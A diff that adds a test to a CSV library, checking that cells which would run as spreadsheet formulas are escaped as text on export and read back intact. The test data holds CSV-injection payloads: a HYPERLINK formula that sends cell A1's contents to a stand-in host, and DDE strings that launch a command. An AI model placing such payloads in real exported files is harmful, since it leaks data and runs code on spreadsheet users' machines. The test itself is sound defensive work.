@@ -45,6 +45,16 @@ describe('reading a delimited file', () => {
   it('writes a CSV back out with the quoting it needs', () => {
     assert.equal(toCsv(['a', 'b'], [['1,2', 'he said "hi"']]), 'a,b\r\n"1,2","he said ""hi"""');
   });
+
+  it('marks a cell that would run as a formula as text, and reads it back as it was (#394)', () => {
+    const payloads = ['=HYPERLINK("http://example.invalid/?"&A1,"fix")', "=cmd|' /C calc'!A0", '+1+2', '@SUM(A1)', '-2+cmd|A0'];
+    const csv = toCsv(['Name', 'Balance'], payloads.map((payload) => [payload, '-500.00']));
+    for (const line of csv.split('\r\n').slice(1)) {
+      assert.match(line, /^"?'/, 'every payload starts with the text mark');
+      assert.match(line, /,-500\.00$/, 'a negative number stays a number');
+    }
+    assert.deepEqual(asRecords(readDelimited(csv)).map((record) => record.Name), payloads);
+  });
 });
 
 describe('working out what a file is', () => {
